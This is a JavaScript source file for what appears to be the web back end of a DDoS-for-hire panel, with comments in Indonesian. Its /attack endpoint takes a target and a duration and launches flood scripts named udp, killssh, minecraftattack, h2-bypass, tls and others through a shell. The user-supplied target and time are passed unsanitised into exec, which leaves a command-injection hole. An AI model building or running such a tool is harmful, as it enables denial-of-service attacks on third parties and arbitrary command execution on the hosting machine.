const express = require('express');
const bodyParser = require('body-parser');
const exec = require('child_process').exec;
const app = express();
const port = 3000;

app.use(bodyParser.json());
app.use(express.static(__dirname));

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

// Endpoint untuk menerima serangan
app.post('/attack', (req, res) => {
  const { layer, method, target, time } = req.body;
  let command;

  if (layer === 'layer4') {
    // Layer 4 methods
    if (method === 'udp') {
      command = `node ${__dirname}/lib/cache/udp ${target} 22 root ${time}`;
    } else if (method === 'killssh') {
      command = `node ${__dirname}/lib/cache/StarsXSSH ${target} 22 root ${time}`;
    } else if (method === 'minecraftattack') {
      command = `node ${__dirname}/lib/cache/StarsXMc ${target} 22 root ${time}`;
    }
  } else if (layer === 'layer7') {
    // Layer 7 methods (excluding udp, killssh, minecraftattack)
    const layer7Methods = [
      'flood', 'floodapi', 'floodvip', 'floodv2', 'tls', 'strike', 'hold', 
      'kill', 'h2-bypass', 'storm', 'h2-flood', 'destroy', 'bypass', 'raw', 
      'thunder', 'ninja', 'glory'
    ];

    if (layer7Methods.includes(method)) {
      command = `node ${__dirname}/lib/cache/${method} ${target} ${time}`;
    } else {
      return res.status(400).json({ error: 'Invalid Layer 7 method.' });
    }
  } else {
    return res.status(400).json({ error: 'Invalid attack layer.' });
  }

  // Menjalankan perintah serangan
  exec(command, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).json({ error: `Execution error: ${stderr}` });
    }
    res.json({
      status: 'Attack started',
      command: command,
      output: stdout
    });
  });
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});